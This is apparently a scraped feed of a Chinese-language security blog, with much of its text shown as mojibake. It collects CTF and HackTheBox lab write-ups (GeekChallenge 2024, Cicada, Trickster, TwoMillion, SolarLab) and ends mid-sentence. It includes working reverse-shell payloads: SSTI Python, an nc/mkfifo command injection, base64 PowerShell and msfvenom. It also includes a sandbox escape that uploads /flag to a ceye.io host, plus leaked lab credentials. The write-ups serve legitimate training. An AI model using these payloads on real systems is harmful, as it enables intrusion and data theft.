None\rtry:\rreturn (f\u0026#39;\u0026#39;\u0026#39;Exception: {str(e)}\u0026#39;\u0026#39;\u0026#39;, 500)\re = None\rdel e\rreturn (\u0026#39;No data provided\u0026#39;, 400)\rreturn redirect(url_for(\u0026#39;login\u0026#39;))\rreturn None å€¼å¾—æ³¨æ„çš„å°±æ˜¯è¿™ä¸ªxmlçš„è·¯ç”±ï¼Œå…¶ä¸­åŒ…å«äº†æ›´æ–°æ“ä½œ\nç”±äºæ•°æ®æ˜¯ç›´æ¥è·å–çš„request.dataå¹¶ä¸”åªèƒ½é€šè¿‡jsonæ ¼å¼è·å–ï¼Œé‚£ä¹ˆå®¹æ˜“è”æƒ³åˆ°pythonçš„åŸå‹é“¾æ±¡æŸ“\nåŒ…æ‹¬åœ¨æå®¢å¤§æŒ‘æˆ˜2023çš„æ–‡ç« ä¸­ä¹Ÿå‡ºç°è¿‡ç±»ä¼¼é¢˜ç›®ï¼Œè¿™é‡Œä¸å†èµ˜è¿°\næå®¢å¤§æŒ‘æˆ˜2023 - HYH (hyhforever.top)\nPythonåŸå‹é“¾æ±¡æŸ“æ”»å‡»åˆ©ç”¨æŠ€å·§ - Pyå­¦ä¹  (python88.com)\næ€»çš„æ€è·¯æ¥è¯´ï¼Œå°±æ˜¯å¯¹app.configé‡Œçš„xmlå€¼è¿›è¡Œæ›´æ–°ï¼Œç„¶åè¯·æ±‚xml_parseè¿›è¡Œæ¸²æŸ“\nblack_list = [\r\u0026#39;__class__\u0026#39;.encode(),\r\u0026#39;__init__\u0026#39;.encode(),\r\u0026#39;__globals__\u0026#39;.encode()] é»‘åå•å¯ä»¥ä½¿ç”¨unicodeç¼–ç ç»•è¿‡ï¼Œä¹Ÿå°±æ˜¯\\u00åŠ ä¸Šåå…­è¿›åˆ¶çš„æ•°å­—\nè¿™æ®µä»£ç ä¸ºä»€ä¹ˆä¼šå‡ºç°XXEï¼Ÿ\né—®é¢˜å°±åœ¨äºè¿™é‡Œçš„etree.XMLParseré‡Œçš„ç¬¬äºŒä¸ªå‚æ•°resolve_entitiesï¼Œå¦‚æœè®¾ç½®ä¸ºäº†Trueï¼Œåˆ™å…è®¸å¼•å…¥å¤–éƒ¨å®ä½“\nXXEçš„éƒ¨åˆ†å¯ä»¥ç®€å•çœ‹ä¸€ä¸‹è¿™å‡ ç¯‡æ–‡ç« \nXXEæ¼æ´\u0026amp;ç»•è¿‡ - CxAgoni - åšå®¢å›­ (cnblogs.com)\nã€å°è¿ªå®‰å…¨ã€‘Day39webæ¼æ´-XXE\u0026amp;XMLä¹‹åˆ©ç”¨æ£€æµ‹ç»•è¿‡å…¨è§£ - å“”å“©å“”å“© (bilibili.com)\nè‡³äºè¿™ä¸ªfileåè®®ï¼Œä¸æ¸…æ¥šæ˜¯ä¸æ˜¯pythonåŒ…é‡Œçš„è‡ªå¸¦çš„è¿‡æ»¤ï¼Œå°å†™çš„fileæ˜¯ä¼šæŠ¥é”™invalid character\nå‘åŒ…ä¹‹ååœ¨æ¥åˆ°/xml_parseè·¯ç”±è®¿é—®å³å¯è·å–åˆ°flag\nnoSandbox #\rmongoDBæ³¨å…¥+æ²™ç›’é€ƒé€¸\nMongoDBæ³¨å…¥çš„ç›¸å…³çŸ¥è¯†\nbeginCTF 2024 Webæ–¹å‘é¢˜è§£WP å…¨_ctf websocket-CSDNåšå®¢\nNosqlæ³¨å…¥æ€»ç»“ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·\nå¦‚å›¾æ„é€ payloadç™»å½•æˆåŠŸ\nè¿›å…¥æ²™ç›’é€ƒé€¸\nç›¸å…³çŸ¥è¯†æ–‡ç« \nå…¨ä¸–ç•Œæœ€ç®€å•çš„CTF - nnonkey k1n9çš„åšå®¢\nNKCTF2024-web-wp - Eddie_Murphy - åšå®¢å›­ (cnblogs.com)\nè¿™é‡Œä½¿ç”¨çš„æ˜¯curl -Tå°†ç›®æ ‡æ–‡ä»¶å¤–å¸¦\nå¹¶ä¸”ä½¿ç”¨åˆ°äº†ceyeå¹³å°\nCEYEå¹³å°çš„ä½¿ç”¨ - æ—¶å…‰ä¸æ”¹ - åšå®¢å›­ (cnblogs.com) æ„é€ payload\nthrow new Proxy({}, {\rget: function(){\rconst test =`Process`.toLocaleLowerCase();\rconst exp =`child_Process`.toLocaleLowerCase();\rconst cc = arguments.callee.caller;\rconst p = (cc.constructor.constructor(`return ${test}`))();\rconst obj = p.mainModule.require(`${exp}`);\rconst ex = Object.getOwnPropertyDescriptor(obj,\r`${`${`exe`}cSync`}`);\rreturn ex.value(`curl http://5pgv47.ceye.io/ -T /flag`).toString();\r}\r}) å‘åŒ…ååœ¨ceyeä¸­å¾—åˆ°å›æ˜¾\n","date":"2024-10-31","externalUrl":null,"permalink":"/posts/2024/10/geekchallenge2024/","section":"Posts","summary":"","title":"æå®¢å¤§æŒ‘æˆ˜2024","type":"posts"},{"content":"\rBox Info #\rOS Windows Difficulty Easy Nmap Scan #\rå‘ç°é¶æœºå­˜åœ¨smbç½‘ç»œæ–‡ä»¶å…±äº«æœåŠ¡\nä½¿ç”¨smbclientè¿æ¥ï¼Œå‘ç°ä»¥ä¸‹çš„ç›®å½•\nå¹¶ä¸”åœ¨HRçš„ç›®å½•ä¸‹å‘ç°äº†ä¸€ä¸ªtxtæ–‡ä»¶\nDear new hire!\rWelcome to Cicada Corp! We\u0026#39;re thrilled to have you join our team. As part of our security protocols, it\u0026#39;s essential that you change your default password to something unique and secure.\rYour default password is: Cicada$M6Corpb*@Lp#nZp!8\rTo change your password:\r1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.\r2. Once logged in, navigate to your account settings or profile settings section.\r3. Look for the option to change your password. This will be labeled as \u0026#34;Change Password\u0026#34;.\r4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.\r5. After changing your password, make sure to save your changes.\rRemember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.\rIf you encounter any issues or need assistance with changing your password, don\u0026#39;t hesitate to reach out to our support team at support@cicada.htb.\rThank you for your attention to this matter, and once again, welcome to the Cicada Corp team!\rBest regards,\rCicada Corp è·å–ä¸€ä¸ªé»˜è®¤çš„å¯†ç ï¼šCicada$M6Corpb*@Lp#nZp!8\nRID BRUTE FORCE #\rä½¿ç”¨Ridçˆ†ç ´æšä¸¾ç”¨æˆ·\nä½¿ç”¨enum4linux-ngé€šè¿‡Michael wrightsonç”¨æˆ·è¿æ¥åˆ°æœåŠ¡å™¨ï¼Œå¹¶ä¸”æå–å„ç§ä¿¡æ¯\nenum4linux-ng -A -u \u0026#39;Michael.wrightson\u0026#39; -p \u0026#39;Cicada$M6Corpb*@Lp#nZp!8\u0026#39; 10.10.11.35 å‘ç°davidçš„å¯†ç ï¼šaRt$Lp#7t*VQ!3\nè¿æ¥smbclientï¼Œå‘ç°å¤‡ä»½è„šæœ¬\n$sourceDirectory = \u0026#34;C:\\smb\u0026#34;\r$destinationDirectory = \u0026#34;D:\\Backup\u0026#34;\r$username = \u0026#34;emily.oscars\u0026#34;\r$password = ConvertTo-SecureString \u0026#34;Q!3@Lp#M6b*7t*Vt\u0026#34; -AsPlainText -Force\r$credentials = New-Object System.Management.Automation.PSCredential($username, $password)\r$dateStamp = Get-Date -Format \u0026#34;yyyyMMdd_HHmmss\u0026#34;\r$backupFileName = \u0026#34;smb_backup_$dateStamp.zip\u0026#34;\r$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName\rCompress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath\rWrite-Host \u0026#34;Backup completed successfully. Backup file saved to: $backupFilePath\u0026#34; ä½¿ç”¨evil-winrmç™»å½•å¾—åˆ°user.txt\nPrivilege Escalation #\ræŸ¥è¯¢å½“å‰ç”¨æˆ·æƒé™\n*Evil-WinRM* PS C:\\Users\u0026gt; whoami /all å…³äºè¿™ä¸ªSeBackupPrivilegeï¼šWindows Privilege Escalation: SeBackupPrivilege - Hacking Articles\næ ¹æ®æ–‡ç« ä¸­çš„æ­¥éª¤\nä½¿ç”¨pypykatzå¾—åˆ°adminçš„hashå€¼\næœ€åä½¿ç”¨evil-winrmçš„hashç™»å½•åˆ°adminï¼Œå¾—åˆ°root.txt\nSummary #\rå…ˆæ˜¯ç”¨smbå…å¯†ç™»å½•è·å–åˆ°ä¸€ä¸ªæ˜æ–‡å¯†ç ï¼Œç„¶åä½¿ç”¨crackmapexecè¿›è¡ŒRIDçˆ†ç ´ç”¨æˆ·åã€‚\nå¯¹ç”¨æˆ·åè¿›è¡Œéå†ç™»å½•ï¼Œå‘ç°èƒ½å¤Ÿè¿›å…¥çš„SMBè´¦æˆ·ï¼Œå¹¶ä¸”å¾—åˆ°ä¸€ä¸ªåŒ…å«è´¦æˆ·å¯†ç å¤‡ä»½è„šæœ¬ã€‚\nå†ç”¨evil-winrmè¿›è¡Œç™»å½•ä¸‹è½½samå’Œsystemï¼Œé€šè¿‡pypykatzè·å–åˆ°adminçš„hashå€¼ç”¨æ¥è¿›è¡Œhashç™»å½•ï¼Œè·å–åˆ°Administratoræƒé™\nWindowså°±æ˜¯è®©äººå¤´å¤§ã€‚ã€‚ã€‚\n","date":"2024-09-30","externalUrl":null,"permalink":"/posts/2024/09/hackthebox-cicada/","section":"Posts","summary":"","title":"HTB-Cicada","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Git Hack #\ræˆ‘åœ¨tricksterçš„ä¸»åŸŸåå‘ç°äº†ä¸€ä¸ªshopçš„å­åŸŸåç½‘ç«™\nè¿™ä¸ªshopçœ‹èµ·æ¥åƒæ˜¯ä½¿ç”¨PrestaShopæ­å»ºï¼Œæˆ‘æœç´¢äº†ä¸€ä¸‹ç›¸å…³çš„æ¼æ´ï¼Œæ— æ³•ç›´æ¥ä½¿ç”¨\nå¹¶ä¸”å°è¯•äº†shopé‡Œçš„å„ç§æ³¨å…¥ç‚¹ï¼Œæ²¡æœ‰æ˜æ˜¾çš„æ¼æ´ï¼Œä¸è¿‡åœ¨æˆ‘éå†ç›®å½•çš„æ—¶å€™ï¼Œå‘ç°äº†.gitçš„ç›®å½•\nç„¶åæˆ‘ä½¿ç”¨Githackå·¥å…·\n[github author=\u0026ldquo;lijiejie\u0026rdquo; project=\u0026ldquo;GitHack\u0026rdquo;][/github]\nå°†è¿™ä¸ªç›®å½•ä½œä¸ºurlçš„è·¯å¾„ï¼Œè¿›å…¥åˆ°äº†åå°çš„ç™»é™†ç•Œé¢ï¼Œå¹¶ä¸”å¾—åˆ°PrestaShopçš„ç‰ˆæœ¬å·ä¸º8.1.5\nåœ¨ä¹‹å‰çš„.gitç›®å½•ä¸‹æˆ‘æœç´¢åˆ°äº†ä¸€ä¸ªadmin_pannelï¼Œé‡Œé¢å¥½åƒå­˜åœ¨ä¸€ä¸ªadamçš„ç”¨æˆ·\nCVE-2024-34716 #\r[github author=\u0026ldquo;aelmokhtar\u0026rdquo; project=\u0026ldquo;CVE-2024-34716\u0026rdquo;][/github]\nå¾—åˆ°www-dataæƒé™\nåœ¨configé‡Œé¢æ‰¾åˆ°ä¸€äº›ä¿¡æ¯\nç™»å½•ä¸Šmysqlä¹‹åï¼Œåœ¨ps_employeeè¡¨ä¸­å‘ç°jamesçš„å¯†ç hash\nä½¿ç”¨hashcatï¼Œç ´è§£é™¤äº†jamesçš„å¯†ç ï¼šalwaysandforever\nsshç™»å½•ä¸Šå»ï¼Œå¾—åˆ°user.txt\nPrivilege Escalation #\rä¸Šä¼ linpeasï¼Œå‘ç°å½“å‰æœåŠ¡å™¨è¿è¡Œç€docker\nä¸Šä¼ fscanï¼Œå‘ç°172.17.0.2ä¸»æœº\n[github author=\u0026ldquo;shadow1ng\u0026rdquo; project=\u0026ldquo;fscan\u0026rdquo;][/github]\nå¹¶ä¸”å‘ç°5000ç«¯å£æ˜¯æ‰“å¼€çš„\nå°†ç«¯å£ä»£ç†å‡ºæ¥\nè¿›å…¥åˆ°Change Detection\nCVE-2024-32651 #\rç›¸å…³çŸ¥è¯†ï¼šCVE-2024-32651 â€“ï¼ˆChangedetection.ioï¼‰ â€“ Hacktive å®‰å…¨åšå®¢ (hacktivesecurity.com)\né¦–å…ˆåœ¨kaliä¸Šæ‰“å¼€httpserveræœåŠ¡ï¼Œå¹¶ä¸”æ·»åŠ åˆ°change detection\nè¿›å…¥Editï¼Œç¡®ä¿URLã€Timeã€Send notification\nç„¶åè¿›å…¥notificationï¼Œåœ¨Bodyå¤„å†™å…¥SSTIåå¼¹shellçš„è„šæœ¬\n{{ self.__init__.__globals__.__builtins__.__import__(\u0026#39;os\u0026#39;).system(\u0026#39;python -c \\\u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.10.16.30\u0026#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\u0026#34;sh\u0026#34;)\\\u0026#39;\u0026#39;) }} ç„¶åä¿å­˜å³å¯\næ­¤å¤„SSTIçš„åŸç†æ˜¯ï¼Œè¿™ä¸ªæœåŠ¡ä¼šæ¢æµ‹ç½‘ç«™çš„å˜åŒ–ï¼Œå¦‚æœç½‘ç«™å†…å®¹æœ‰å˜åŒ–é‚£ä¹ˆå°±ä¼šè§¦å‘é€šçŸ¥ä¿¡æ¯\nè€ŒBodyæ˜¯å…è®¸ä½¿ç”¨Jinja2æ¨¡æ¿æ¥å†™å†…å®¹\nåœ¨kaliä¸Šé¢ï¼Œç”±äºæ‰“å¼€äº†80ç«¯å£çš„httpserveræœåŠ¡ï¼Œåªéœ€è¦å†™å…¥ä¸€ä¸ªindex.htmlï¼Œå¹¶ä¸”ä¸æ–­ä¿®æ”¹ä»–ç›´åˆ°è¢«æ£€æµ‹åˆ°å°±è¡Œäº†\næˆåŠŸåå¼¹åˆ°shellï¼Œä½†æ˜¯æ²¡æœ‰root.txtå‘¢ï¼Ÿåº”è¯¥åªæ˜¯ä¸€ä¸ªå®¹å™¨\nä½¿ç”¨historyå‘½ä»¤å‘ç°åˆ°å¯†ç ï¼Œå› ä¸ºapt updateéœ€è¦ç®¡ç†å‘˜æƒé™æ‰èƒ½æ‰§è¡Œ\nä½¿ç”¨å¯†ç åˆ‡æ¢åˆ°rootç”¨æˆ·ï¼Œå¾—åˆ°root.txt\nSummary #\rGitæ–‡ä»¶æ³„éœ²å¥½ä¹…æ²¡é‡åˆ°è¿‡ï¼Œåˆšåšçš„æ—¶å€™è¿˜æ²¡æƒ³åˆ°è¿™ä¸ªï¼Œå»è®¨è®ºåŒºçœ‹äº†ä¸€ä¸‹æ‰å‘ç°\nPrestaShopçš„Github CVEï¼Œåœ¨å‡ å¤©å‰æ˜¯ç”¨ä¸äº†çš„ï¼ˆä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼‰ï¼Œåæ¥ä½œè€…ä¿®æ”¹äº†ä¸€ä¸‹åˆèƒ½æ­£å¸¸ä½¿ç”¨äº†\nhistoryæ¥æŸ¥çœ‹å¯†ç æ³„éœ²ä¹Ÿæ˜¯æ¯”è¾ƒç‹¬ç‰¹çš„ç‚¹ï¼Œä¹‹å‰ä¹Ÿæ²¡æƒ³åˆ°\n","date":"2024-09-28","externalUrl":null,"permalink":"/posts/2024/09/hackthebox-trickster/","section":"Posts","summary":"","title":"HTB-Trickster","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap Scan #\rå¼€æ”¾ç«¯å£ï¼š22ã€80\nå¹¶ä¸”æ³¨æ„åˆ°80ç«¯å£ä¸Šæœ‰ä¸€ä¸ªé‡å®šå‘ï¼Œæ·»åŠ åˆ°/etc/hosts\nRegister #\ræ³¨æ„åˆ°æœ‰/loginè·¯ç”±ï¼Œä½¿ç”¨ç®€å•çš„å¯†ç ç»„åˆç™»é™†å¤±è´¥ï¼ŒçŒœæµ‹å­˜åœ¨/registerè·¯ç”±\nä½†æ˜¯éœ€è¦å…ˆæ‹¿åˆ°é‚€è¯·ç \næˆ‘åœ¨æµè§ˆå™¨çš„networké‡Œé¢å‘ç°äº†ä¸€ä¸ªç‹¬ç‰¹çš„jsæ–‡ä»¶\nChatGPTæ˜¯è¿™æ ·åˆ†æçš„\næ§åˆ¶å°ç»™å‡ºä¸€æ®µåŠ å¯†ä¿¡æ¯ï¼ŒåŠ å¯†æ–¹å¼æ˜¯ROT13\néœ€è¦å‘é€ä¸€ä¸ªPOSTåŒ…åˆ°æŒ‡å®šçš„è·¯å¾„\nå°†codeè¿›è¡ŒBase64è§£å¯†å¾—åˆ°é‚€è¯·ç \næ³¨å†Œå®ŒæˆåæˆåŠŸè¿›å…¥é¡µé¢\nRCE #\rç»è¿‡æºä»£ç çš„æ£€æŸ¥ï¼Œå‘ç°å­˜åœ¨/apiçš„è·¯å¾„\n{\r\u0026#34;v1\u0026#34;: {\r\u0026#34;user\u0026#34;: {\r\u0026#34;GET\u0026#34;: {\r\u0026#34;/api/v1\u0026#34;: \u0026#34;Route List\u0026#34;,\r\u0026#34;/api/v1/invite/how/to/generate\u0026#34;: \u0026#34;Instructions on invite code generation\u0026#34;,\r\u0026#34;/api/v1/invite/generate\u0026#34;: \u0026#34;Generate invite code\u0026#34;,\r\u0026#34;/api/v1/invite/verify\u0026#34;: \u0026#34;Verify invite code\u0026#34;,\r\u0026#34;/api/v1/user/auth\u0026#34;: \u0026#34;Check if user is authenticated\u0026#34;,\r\u0026#34;/api/v1/user/vpn/generate\u0026#34;: \u0026#34;Generate a new VPN configuration\u0026#34;,\r\u0026#34;/api/v1/user/vpn/regenerate\u0026#34;: \u0026#34;Regenerate VPN configuration\u0026#34;,\r\u0026#34;/api/v1/user/vpn/download\u0026#34;: \u0026#34;Download OVPN file\u0026#34;\r},\r\u0026#34;POST\u0026#34;: {\r\u0026#34;/api/v1/user/register\u0026#34;: \u0026#34;Register a new user\u0026#34;,\r\u0026#34;/api/v1/user/login\u0026#34;: \u0026#34;Login with existing user\u0026#34;\r}\r},\r\u0026#34;admin\u0026#34;: {\r\u0026#34;GET\u0026#34;: {\r\u0026#34;/api/v1/admin/auth\u0026#34;: \u0026#34;Check if user is admin\u0026#34;\r},\r\u0026#34;POST\u0026#34;: {\r\u0026#34;/api/v1/admin/vpn/generate\u0026#34;: \u0026#34;Generate VPN for specific user\u0026#34;\r},\r\u0026#34;PUT\u0026#34;: {\r\u0026#34;/api/v1/admin/settings/update\u0026#34;: \u0026#34;Update user settings\u0026#34;\r}\r}\r}\r} å°è¯•ä½¿ç”¨/api/adminï¼Œç¡®å®å­˜åœ¨\nè®¿é—®/api/v1/admin/vpn/generateï¼Œæœ‰èº«ä»½éªŒè¯\nåœ¨/api/v1/admin/settings/updateè·¯å¾„ä¸­æœ‰ä¸åŒçš„å“åº”å¤´ï¼Œå› ä¸ºä¸å…è®¸ç”¨GETæˆ–è€…POSTæ–¹å¼ï¼Œäºæ˜¯å°è¯•ä½¿ç”¨äº†PUT\nå…¶ä¸­è¿”å›çš„ä¿¡æ¯é‡Œä¼šæç¤ºç¼ºå¤±çš„å‚æ•°ï¼Œè¡¥å…¨å³å¯ï¼Œå¦‚å›¾å°†æˆ‘çš„è´¦æˆ·è®¾ç½®ä¸ºäº†admin\nç°åœ¨æˆ‘ä»¬å†æ¥æµ‹è¯•admin\nå°è¯•å»è·å¾—adminçš„vpn\nä½†æ˜¯å‘¢è¿™é‡Œå¹¶æ²¡æœ‰åŠæ³•è¿›è¡Œè¿æ¥\nå°è¯•åœ¨è¿™é‡Œè¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œå‘ç°æˆåŠŸ\n{\r\u0026#34;username\u0026#34;:\u0026#34;hyh;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2\u0026gt;\u0026amp;1|nc 10.10.16.29 100 \u0026gt;/tmp/f;\u0026#34;\r} æ‹¿åˆ°www-dataçš„shell\nä¸Šä¼ linpeas.shï¼Œå‘ç°3306çš„ç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œå¯èƒ½å­˜åœ¨æ•°æ®åº“æœåŠ¡\nå¹¶ä¸”å‘ç°äº†æ•°æ®åº“çš„ç”¨æˆ·åå’Œå¯†ç \nsshç™»å½•æˆåŠŸï¼è·å¾—user.txt\nPrivilege Escalation #\ræˆ‘åœ¨æ•°æ®åº“ä¸­å‘ç°äº†å…¶ä»–ä¸¤ä¸ªç”¨æˆ·çš„å¯†ç \nä¸è¿‡éƒ½æ— æ³•çˆ†ç ´æˆåŠŸ\nåœ¨/var/mailæ–‡ä»¶å¤¹ä¸‹å‘ç°äº†ä¿¡æ¯\nFrom: ch4p \u0026lt;ch4p@2million.htb\u0026gt;\rTo: admin \u0026lt;admin@2million.htb\u0026gt;\rCc: g0blin \u0026lt;g0blin@2million.htb\u0026gt;\rSubject: Urgent: Patch System OS\rDate: Tue, 1 June 2023 10:45:22 -0700\rMessage-ID: \u0026lt;9876543210@2million.htb\u0026gt;\rX-Mailer: ThunderMail Pro 5.2\rHey admin,\rI\u0026#39;m know you\u0026#39;re working as fast as you can to do the DB migration. While we\u0026#39;re partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can\u0026#39;t get popped by that.\rHTB Godfather æ„æ€æ˜¯ä¼¼ä¹è¿™ä¸ªç³»ç»Ÿå­˜åœ¨æŸä¸ªLinuxçš„å†…æ ¸CVE\nCVE-2023-0386 #\rGithubï¼šxkaneiki/CVE-2023-0386: CVE-2023-0386åœ¨ubuntu22.04ä¸Šçš„ææƒ (github.com)\nå°†å…¶è¿œç¨‹ä¸‹è½½ä¸‹æ¥\næ‹¿åˆ°root.txtï¼\nSummary #\rè¿™ä¸ªæ³¨å†Œå¥½åƒæ˜¯HTBå¹³å°ä¹‹å‰çš„ä¸€ä¸ªå°å½©è›‹ï¼Œéœ€è¦ç”¨æˆ·è‡ªå·±åœ¨ç½‘ç«™çš„jsé‡Œæ‰¾åˆ°é‚€è¯·ç æ‰èƒ½æ³¨å†Œ\nææƒéƒ¨åˆ†ç»™çš„æç¤ºå°±æ¯”è¾ƒç›´æ¥äº†ï¼Œå¯ä»¥ç›´æ¥åœ¨æœç´¢å¼•æ“é‡Œæ‰¾åˆ°å¯¹åº”çš„poc\n","date":"2024-09-21","externalUrl":null,"permalink":"/posts/2024/09/hackthebox-towmillion/","section":"Posts","summary":"","title":"HTB-TowMillion","type":"posts"},{"content":"\rBox Info #\rOS Windows Difficulty Medium Nmap Scan #\rå¼€æ”¾ç«¯å£ï¼š80ã€135ã€139ã€445\nå¯ä»¥çœ‹åˆ°å­˜åœ¨smbæœåŠ¡ï¼ˆSMBæ˜¯ä¸€ç§ç½‘ç»œæ–‡ä»¶å…±äº«åè®®ï¼‰\nå°è¯•ä½¿ç”¨smbclientè¿›è¡Œè¿æ¥\néœ€è¦å¯†ç ï¼Œä¸è¿‡èƒ½çœ‹å‡ºæœ‰ä¸€äº›åˆ†äº«çš„èµ„æº\nä½¿ç”¨å…å¯†è¿æ¥ï¼ŒæˆåŠŸè¿›å…¥Documents\nä½¿ç”¨getå‘½ä»¤å°†æ–‡ä»¶ä¸‹è½½ä¸‹æ¥\nåœ¨details-file.xlsxé‡Œé¢å‘ç°äº†æ•æ„Ÿä¿¡æ¯\nSubdomain Fuzzing #\rå‘ç°reportå­åŸŸå\nä¸è¿‡ç›´æ¥è¿›å…¥è¯¥å­åŸŸåä¼šé‡å®šå‘åˆ°solarlab.htbï¼Œäºæ˜¯å†è¿›è¡Œä¸€æ¬¡å…¨ç«¯å£æ‰«æï¼Œåº”è¯¥æ˜¯è¿˜æœ‰é—æ¼çš„ç«¯å£\nè¿›å…¥6791ç«¯å£ï¼Œæ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢\nä¹‹å‰ä¸‹è½½äº†ä¸€ä¸ªxlsxè¡¨æ ¼é‡Œé¢æœ‰ç”¨æˆ·åå’Œå¯†ç ï¼Œè¿›è¡Œé€ä¸€å°è¯•\nAlexanderKå’ŒClaudiaSéƒ½æ˜¯ç”¨æˆ·è®¤è¯å¤±è´¥ï¼Œå…¶ä½™çš„éƒ½æ˜¯ç”¨æˆ·ä¸å­˜åœ¨ï¼Œå¯ä»¥æ³¨æ„åˆ°çš„æ˜¯blakeçš„å¯†ç ä¼¼ä¹æ¯”è¾ƒç‰¹åˆ«ï¼Œä½†æ˜¯ç”¨æˆ·åæ ¼å¼ä¸å¦å¤–çš„ä¸å¯¹ï¼ŒçŒœæµ‹çœŸæ­£çš„ç”¨æˆ·ååº”è¯¥æ˜¯ï¼šblakeB\nç™»å½•æˆåŠŸ\nCVE-2023-33733 #\rGithubï¼šL41KAA/CVE-2023-33733-Exploit-PoC (github.com)\nå‡†å¤‡å¥½powershellçš„åå¼¹shell\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop/Solarlab/CVE-2023-33733-Exploit-PoC]\râ””â”€# python exp.py --host \u0026#34;report.solarlab.htb\u0026#34; --port 6791 --cmd \u0026#34;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMgA5ACIALAAxADAAMAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=\u0026#34; --username \u0026#34;blakeB\u0026#34; --password \u0026#34;ThisCanB3typedeasily1@\u0026#34; æˆåŠŸåå¼¹åˆ°shellï¼Œå¹¶ä¸”åœ¨blakeçš„æ¡Œé¢æ‹¿åˆ°user.txt\nPrivilege Escalation #\rè¿™é‡Œç»™é¶æœºä¸Šä¸€ä¸ªmsfæœ¨é©¬\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop/Solarlab]\râ””â”€# msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.16.29 lport=6789 -f exe -o shell.exe â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop/Solarlab]\râ””â”€# python -m http.server 80\rServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\r10.10.11.16 - - [19/Sep/2024 07:41:48] \u0026#34;GET /shell.exe HTTP/1.1\u0026#34; 200 - åœ¨ç›®å½•éå†ä¸­ï¼Œæˆ‘å‘ç°äº†ä¸€ä¸ªOpenfireæ–‡ä»¶å¤¹ä½äºProgram Filesä¸­\n#æŸ¥çœ‹ç«¯å£æƒ…å†µ\rnetstat -an | findstr LISTEN å‘ç°äº†å¾ˆå¤šopenfireç›¸å…³çš„æœåŠ¡æ­£åœ¨è¿è¡Œä¸­\nå¹¶ä¸”ç»è¿‡ä¿¡æ¯æ”¶é›†å‘ç°openfireæ˜¯å­˜åœ¨RCEæ¼æ´çš„\nGithubï¼šK3ysTr0K3R/CVE-2023-32315-EXPLOIT: A PoC exploit for CVE-2023-32315 - Openfire Authentication Bypass (github.com)\nå¹¶ä¸”ä¹Ÿå¯ä»¥curlæŸ¥çœ‹åˆ°å­˜åœ¨ç™»å½•ç•Œé¢\nç”±äºmeterpreterè‡ªå¸¦çš„æœ‰ç«¯å£è½¬å‘å·¥å…·ï¼ˆportfwdï¼‰ï¼Œæˆ‘å°è¯•äº†ä¸€ä¸‹ï¼Œæ— æ³•ä½¿ç”¨ï¼Œwhyï¼Ÿï¼Ÿï¼Ÿï¼Ÿ\næˆ–è®¸æ˜¯å› 